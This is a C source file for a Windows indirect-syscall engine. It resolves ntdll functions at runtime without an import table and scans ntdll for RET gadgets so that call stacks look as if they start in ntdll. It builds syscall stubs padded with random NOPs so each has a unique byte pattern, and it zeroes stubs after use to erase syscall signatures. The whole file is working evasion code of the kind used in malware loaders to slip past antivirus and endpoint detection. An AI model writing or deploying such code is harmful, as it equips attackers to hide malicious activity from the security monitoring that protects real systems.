#include "indirect_syscall.h"
#include "hades_gate.h"
#include <winternl.h>
#include <intrin.h>

//
// Bootstrap function pointers — resolved at runtime from in-memory ntdll
// via Hades Gate (no static link to ntdll.lib, no IAT dependency).
//
typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI* pfnNtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);

static pfnNtAllocateVirtualMemory_t g_BootstrapAllocate = NULL;
static pfnNtProtectVirtualMemory_t  g_BootstrapProtect = NULL;
static pfnNtFreeVirtualMemory_t     g_BootstrapFree = NULL;

//
// Must be called once before any stub building.
//
BOOL BootstrapNtFunctions(void)
{
    PVOID ntdll = HadesGetNtdllBase();
    if (!ntdll)
        return FALSE;

    g_BootstrapAllocate = (pfnNtAllocateVirtualMemory_t)
        HadesGetProcR(ntdll, "NtAllocateVirtualMemory");
    g_BootstrapProtect = (pfnNtProtectVirtualMemory_t)
        HadesGetProcR(ntdll, "NtProtectVirtualMemory");
    g_BootstrapFree = (pfnNtFreeVirtualMemory_t)
        HadesGetProcR(ntdll, "NtFreeVirtualMemory");

    return (g_BootstrapAllocate && g_BootstrapProtect && g_BootstrapFree);
}

//
// Internal wrappers for page allocation / protection.
// These use the real ntdll functions (bootstrapping only —
// before our own stubs are ready).
//
static NTSTATUS BootstrapAlloc(PVOID* BaseAddr, PSIZE_T RegionSize,
    ULONG AllocationType, ULONG Protect)
{
    return g_BootstrapAllocate(
        (HANDLE)(LONG_PTR)-1,
        BaseAddr, 0, RegionSize,
        AllocationType, Protect
    );
}

static NTSTATUS BootstrapProtect(PVOID* BaseAddr, PSIZE_T RegionSize, ULONG NewProtect)
{
    ULONG Old;
    return g_BootstrapProtect(
        (HANDLE)(LONG_PTR)-1,
        BaseAddr, RegionSize,
        NewProtect, &Old
    );
}

static NTSTATUS BootstrapFree(PVOID* BaseAddr, PSIZE_T RegionSize)
{
    return g_BootstrapFree(
        (HANDLE)(LONG_PTR)-1,
        BaseAddr, RegionSize,
        MEM_RELEASE
    );
}

//
// Multi-byte NOP templates (Intel Architecture, true NOPs — no register/flag modification)
//
typedef struct _NOP_TEMPLATE {
    BYTE  Bytes[8];
    BYTE  Length;
} NOP_TEMPLATE;

static const NOP_TEMPLATE g_NopTemplates[] =
{
    { { 0x90 }, 1 },
    { { 0x66, 0x90 }, 2 },
    { { 0x0F, 0x1F, 0x00 }, 3 },
    { { 0x0F, 0x1F, 0x40, 0x00 }, 4 },
    { { 0x0F, 0x1F, 0x44, 0x00, 0x00 }, 5 },
    { { 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00 }, 6 },
    { { 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00 }, 7 },
    { { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 }, 8 },
};

#define NOP_COUNT (sizeof(g_NopTemplates) / sizeof(g_NopTemplates[0]))

//
// LCG — classic glibc rand() equivalent
//
ULONG LCGNext(ULONG* Seed)
{
    *Seed = (*Seed * 1103515245 + 12345) & 0x7FFFFFFF;
    return *Seed;
}

ULONG LCGNextRange(ULONG* Seed, ULONG Min, ULONG Max)
{
    if (Max <= Min)
        return Min;
    ULONG range = Max - Min;
    return Min + (LCGNext(Seed) % range);
}

//
// Scan the .text section of in-memory ntdll for a RET (0xC3) byte
// that is plausibly a standalone ret instruction.
//
static PBYTE ScanForRet(PBYTE TextStart, ULONG TextSize, ULONG_PTR PreferredOffset)
{
    ULONG start = 0;
    ULONG end = TextSize;
    ULONG i;

    if (PreferredOffset > 0 && PreferredOffset < TextSize)
    {
        start = (PreferredOffset > 8) ? (PreferredOffset - 8) : 0;
        end = (PreferredOffset + 8 < TextSize) ? (PreferredOffset + 8) : TextSize;
    }
    else
    {
        //
        // Prefer addresses in the lower 2GB of the .text section for
        // compatibility with 32-bit displacement encoding. Also good
        // for push imm32 (sign-extended).
        //
        end = (TextSize > 0x8000) ? 0x8000 : TextSize;
    }

    for (i = start; i < end; i++)
    {
        if (TextStart[i] == 0xC3)
        {
            //
            // Verify this is not part of a longer instruction by checking
            // the preceding byte isn't a typical prefix or opcode continuation
            //
            if (i > 0)
            {
                BYTE prev = TextStart[i - 1];
                //
                // Skip if preceded by: REX (0x40-0x4F), 0x66, 0x0F, 0xFF, 0xE8, 0xE9
                //
                if ((prev >= 0x40 && prev <= 0x4F) || prev == 0x66 || prev == 0x0F ||
                    prev == 0xFF || prev == 0xE8 || prev == 0xE9 || prev == 0xEB)
                {
                    continue;
                }
            }
            return &TextStart[i];
        }
    }

    return NULL;
}

//
// Find a RET gadget in ntdll's .text section (general purpose)
//
PVOID FindRetGadgetInNtdll(PVOID NtdllBase)
{
    HADES_NTDLL_INFO Info;

    if (!HadesGetNtdllInfo(&Info))
        return NULL;
    if (!Info.TextStart || Info.TextSize < 4)
        return NULL;

    return ScanForRet((PBYTE)Info.TextStart, Info.TextSize, 0);
}

//
// Find a RET gadget near a specific function's prologue
// (better stack spoofing: the return address looks like it
//  came from inside or near a known ntdll function)
//
PVOID FindRetGadgetInFunction(PVOID NtdllBase, PCSTR FunctionName)
{
    HADES_NTDLL_INFO Info;
    PVOID FuncAddr;
    ULONG_PTR FuncRva;

    if (!HadesGetNtdllInfo(&Info))
        return NULL;
    if (!Info.TextStart || Info.TextSize < 4)
        return NULL;

    FuncAddr = HadesGetProcR(NtdllBase, FunctionName);
    if (!FuncAddr)
        return FindRetGadgetInNtdll(NtdllBase);

    FuncRva = (ULONG_PTR)FuncAddr - (ULONG_PTR)NtdllBase;
    return ScanForRet((PBYTE)Info.TextStart, Info.TextSize, FuncRva);
}

//
// Inline the generation of a random NOP sequence
//
static ULONG WriteRandomNop(PBYTE Buffer, ULONG* Seed)
{
    ULONG idx = LCGNextRange(Seed, 0, (ULONG)NOP_COUNT);
    const NOP_TEMPLATE* tmpl = &g_NopTemplates[idx];

    CopyMemory(Buffer, tmpl->Bytes, tmpl->Length);
    return tmpl->Length;
}

//
// Build a base indirect syscall stub (no junk, fixed layout):
//
//   mov r11, <ntdll_ret_addr>   ; 49 BB XX XX XX XX XX XX XX XX  (10 bytes)
//   push r11                    ; 41 52                          (2 bytes)
//   mov r10, rcx                ; 4C 8B D1                      (3 bytes)
//   mov eax, SSN                ; B8 XX XX XX XX                (5 bytes)
//   syscall                     ; 0F 05                         (2 bytes)
//   ret                         ; C3                             (1 byte)
//   Total: 23 bytes
//
// The ntdll_ret_addr is pushed onto the stack before syscall.
// After syscall returns, `ret` jumps to ntdll_ret_addr which is
// a `ret` instruction in ntdll. That `ret` then jumps to the
// real caller, making the call stack show ntdll as the origin.
//
PVOID BuildIndirectSyscallStub(
    ULONG  SSN,
    PVOID  RetGadget,
    PULONG OutSize
)
{
    PBYTE Stub;
    ULONG StubSize = 23;
    ULONG Written = 0;
    ULONG_PTR RetAddr = (ULONG_PTR)RetGadget;
    NTSTATUS Status;
    SIZE_T RegionSize = 4096;
    PVOID BaseAddr = NULL;

    //
    // Allocate RW memory for stub construction (W^X: not executable yet)
    //
    BaseAddr = NULL;
    RegionSize = 4096;

    Status = BootstrapAlloc(
        &BaseAddr,
        &RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(Status))
        return NULL;

    Stub = (PBYTE)BaseAddr;

    //
    // mov r11, <ntdll_ret_addr>
    // REX.WB (49) + B8+reg(r11=3) = 49 B8; plus 8-byte immediate
    // Encoding: 49 B8 <8-byte addr>
    //
    Stub[0] = 0x49;
    Stub[1] = 0xBB;
    *(ULONG_PTR*)(Stub + 2) = RetAddr;
    Written += 10;

    //
    // push r11
    // 41 52
    //
    Stub[Written] = 0x41;
    Stub[Written + 1] = 0x52;
    Written += 2;

    //
    // mov r10, rcx
    // 4C 8B D1
    //
    Stub[Written] = 0x4C;
    Stub[Written + 1] = 0x8B;
    Stub[Written + 2] = 0xD1;
    Written += 3;

    //
    // mov eax, SSN
    // B8 XX XX XX XX
    //
    Stub[Written] = 0xB8;
    *(ULONG*)(Stub + Written + 1) = SSN;
    Written += 5;

    //
    // syscall
    // 0F 05
    //
    Stub[Written] = 0x0F;
    Stub[Written + 1] = 0x05;
    Written += 2;

    //
    // ret
    // C3
    //
    Stub[Written] = 0xC3;
    Written += 1;

    if (OutSize)
        *OutSize = Written;

    return (PVOID)Stub;
}

//
// Build an indirect syscall stub with random NOP/junk inserts for
// byte-level diversity. Each stub will have a unique byte pattern.
//
PVOID BuildIndirectSyscallStubDiverse(
    ULONG  SSN,
    PVOID  RetGadget,
    ULONG  Seed,
    PULONG OutSize
)
{
    PBYTE Stub;
    //
    // Max size: base 23 bytes + 4 NOP slots * 8 bytes max = 55 bytes.
    // Allocate a full page for safety.
    //
    ULONG MaxSize = 64;
    ULONG Written = 0;
    ULONG_PTR RetAddr = (ULONG_PTR)RetGadget;
    ULONG NopSlots;
    NTSTATUS Status;
    SIZE_T RegionSize = 4096;
    PVOID BaseAddr = NULL;

    BaseAddr = NULL;
    RegionSize = 4096;

    Status = BootstrapAlloc(
        &BaseAddr,
        &RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(Status))
        return NULL;

    Stub = (PBYTE)BaseAddr;

    //
    // Decide how many NOP slots (0-3) to insert randomly
    //
    NopSlots = LCGNextRange(&Seed, 0, 3);

    //
    // mov r11, <ntdll_ret_addr>
    //
    Stub[Written] = 0x49;
    Stub[Written + 1] = 0xBB;
    *(ULONG_PTR*)(Stub + Written + 2) = RetAddr;
    Written += 10;

    //
    // NOP slot 0 (after address load)
    //
    if (NopSlots > 0)
    {
        Written += WriteRandomNop(Stub + Written, &Seed);
    }

    //
    // push r11
    //
    Stub[Written] = 0x41;
    Stub[Written + 1] = 0x52;
    Written += 2;

    //
    // NOP slot 1 (after push)
    //
    if (NopSlots > 1)
    {
        Written += WriteRandomNop(Stub + Written, &Seed);
    }

    //
    // mov r10, rcx
    //
    Stub[Written] = 0x4C;
    Stub[Written + 1] = 0x8B;
    Stub[Written + 2] = 0xD1;
    Written += 3;

    //
    // NOP slot 2 (after mov r10, rcx)
    //
    if (NopSlots > 2)
    {
        Written += WriteRandomNop(Stub + Written, &Seed);
    }

    //
    // mov eax, SSN
    //
    Stub[Written] = 0xB8;
    *(ULONG*)(Stub + Written + 1) = SSN;
    Written += 5;

    //
    // syscall
    //
    Stub[Written] = 0x0F;
    Stub[Written + 1] = 0x05;
    Written += 2;

    //
    // ret
    //
    Stub[Written] = 0xC3;
    Written += 1;

    if (OutSize)
        *OutSize = Written;

    return (PVOID)Stub;
}

//
// Flip page protection from RW -> RX (W^X compliance)
//
BOOL MakeStubExecutableReadOnly(PVOID StubAddress, ULONG StubSize)
{
    ULONG OldProtect;

    if (!StubAddress || StubSize == 0)
        return FALSE;

    if (g_BootstrapProtect)
    {
        PVOID Addr = StubAddress;
        SIZE_T Size = StubSize;
        if (g_BootstrapProtect(
            (HANDLE)(LONG_PTR)-1,
            &Addr,
            &Size,
            PAGE_EXECUTE_READ,
            &OldProtect
        ) >= 0)
        {
            return TRUE;
        }
    }

    return FALSE;
}

//
// Wipe and free a stub (zero memory, restore RW, release)
//
void DestroyStub(PVOID StubAddress, ULONG StubSize)
{
    ULONG OldProtect;
    SIZE_T RegionSize = 4096;
    PVOID BaseAddr = StubAddress;

    if (!StubAddress)
        return;

    //
    // Make writable first
    //
    RegionSize = 4096;
    if (g_BootstrapProtect)
    {
        g_BootstrapProtect(
            (HANDLE)(LONG_PTR)-1,
            &BaseAddr,
            &RegionSize,
            PAGE_READWRITE,
            &OldProtect
        );
    }

    //
    // Zero memory to erase any syscall byte patterns
    //
    ZeroMemory(StubAddress, 4096);

    //
    // Free
    //
    if (g_BootstrapFree)
    {
        g_BootstrapFree(
            (HANDLE)(LONG_PTR)-1,
            &BaseAddr,
            &RegionSize,
            MEM_RELEASE
        );
    }
}

// -----------------------------------------------------------------
// Hash table registry for syscall stub entries
// -----------------------------------------------------------------

static ULONG HashString(PCSTR Str)
{
    ULONG Hash = 5381;
    INT c;

    while ((c = *Str++) != 0)
    {
        Hash = ((Hash << 5) + Hash) + (c | 0x20);
    }

    return Hash % SYSCALL_HASH_SIZE;
}

void SyscallRegistryInit(PSYSCALL_REGISTRY Reg)
{
    if (!Reg)
        return;
    ZeroMemory(Reg, sizeof(SYSCALL_REGISTRY));
}

BOOL SyscallRegistryInsert(PSYSCALL_REGISTRY Reg, PSYSCALL_STUB_ENTRY Entry)
{
    ULONG Bucket;
    PSYSCALL_STUB_ENTRY* Head;

    if (!Reg || !Entry)
        return FALSE;

    Bucket = HashString(Entry->FunctionName);
    Head = &Reg->Buckets[Bucket];

    //
    // Check for duplicate
    //
    {
        PSYSCALL_STUB_ENTRY Cur = *Head;
        while (Cur)
        {
            if (_stricmp(Cur->FunctionName, Entry->FunctionName) == 0)
                return FALSE;
            Cur = Cur->Next;
        }
    }

    Entry->Next = *Head;
    *Head = Entry;
    Reg->Count++;

    return TRUE;
}

PSYSCALL_STUB_ENTRY SyscallRegistryLookup(PSYSCALL_REGISTRY Reg, PCSTR FunctionName)
{
    ULONG Bucket;
    PSYSCALL_STUB_ENTRY Cur;

    if (!Reg || !FunctionName)
        return NULL;

    Bucket = HashString(FunctionName);
    Cur = Reg->Buckets[Bucket];

    while (Cur)
    {
        if (_stricmp(Cur->FunctionName, FunctionName) == 0)
            return Cur;
        Cur = Cur->Next;
    }

    return NULL;
}
